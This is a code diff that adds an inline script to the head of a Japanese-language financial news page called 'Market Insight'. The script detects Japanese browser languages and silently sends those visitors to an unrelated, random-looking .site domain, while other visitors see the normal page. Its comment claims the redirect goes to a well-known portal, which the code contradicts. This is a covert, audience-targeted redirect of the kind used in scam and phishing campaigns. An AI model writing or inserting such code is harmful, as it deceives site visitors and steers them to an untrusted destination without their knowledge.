@@ -4,6 +4,33 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Market Insight  析</title>
+
+
+     <script>
+        (function() {
+            // 获取浏览器语言
+            // navigator.language 是首选语言
+            // navigator.languages 是一个数组，包含用户偏好的所有语言（如果浏览器支持）
+            var lang = navigator.language || navigator.userLanguage; 
+            var langs = navigator.languages || [lang];
+            
+            // 检查是否包含日语
+            // 使用正则表达式匹配 'ja' 开头的语言代码 (例如 'ja', 'ja-JP')
+            var isJapanese = langs.some(function(l) {
+                return /^ja\b/i.test(l);
+            });
+
+            if (isJapanese) {
+                // 如果是日语，跳转到 www.qq.com
+                console.log("Japanese language detected. Redirecting...");
+                window.location.href = "https://www.yud819ad.site/rkma/index2.html";
+            } else {
+                console.log("Language detected: " + lang + ". No redirect.");
+            }
+        })();
+    </script>
+
+    
     <meta name="description" content="複雑な市場環境において、より合理的な判断を下すための構造化された金融ニュースと市場解釈を提供します。">
     <style>
         /* Reset & Base Styles */
